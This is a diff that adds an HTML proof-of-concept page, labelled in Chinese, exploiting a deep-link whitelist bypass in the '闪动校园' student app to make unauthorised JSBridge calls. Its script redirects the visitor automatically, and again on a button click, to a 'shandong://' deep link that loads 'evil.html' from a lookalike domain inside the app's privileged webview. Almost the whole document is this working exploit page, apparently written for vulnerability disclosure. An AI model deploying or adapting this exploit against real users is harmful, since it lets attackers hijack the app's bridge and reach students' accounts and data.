@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>打开闪动校园</title>
+<link rel="stylesheet" href="https://unpkg.com/mdui@2/mdui.css">
+<script src="https://unpkg.com/mdui@2/mdui.global.js"></script>
+<style>
+  body{font:14px/1.6 -apple-system,sans-serif;margin:0;padding:60px 16px;background:#fafafa;color:#222}
+  .wrap{max-width:420px;margin:0 auto;display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center}
+  h2{font-size:18px;margin:0;line-height:1.4;text-align:center}
+  p{margin:0;color:#666;font-size:13px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h2>闪动校园学生端<br>深链白名单绕过导致 JSBridge 越权调用<br>PoC</h2>
+  <p>若未自动跳转,点击下方按钮</p>
+  <mdui-button variant="filled" id="go">打开闪动校园</mdui-button>
+</div>
+<script>
+var DEEPLINK = "shandong://huanchenjie.com/ThirdTransfer?path=/base/d_webview&url=https%3A%2F%2Ftyldx-huachenjie.com%2Fevil.html";
+document.getElementById("go").addEventListener("click", function(){ location.href = DEEPLINK; });
+setTimeout(function(){ location.href = DEEPLINK; }, 600);
+</script>
+</body>
+</html>
